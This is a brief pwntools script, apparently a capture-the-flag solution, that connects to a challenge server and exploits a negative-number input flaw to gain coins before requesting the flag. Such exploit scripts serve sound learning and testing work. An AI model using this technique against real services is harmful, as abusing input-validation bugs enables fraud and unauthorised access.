from pwn import *

io = remote('ip', 31337)

# Loop through 40 times (backwards)
# This will allow us to deal with XOR in final stage
for i in range(40, 0, -1):
    io.sendline('1')
    io.sendlineafter(':', str(i))

# Get coins
io.sendline('2')
# Negative value to add 100 coins
io.sendlineafter('?', '-100')
# Try and get flag
io.sendline('3')

# Win?
io.interactive()
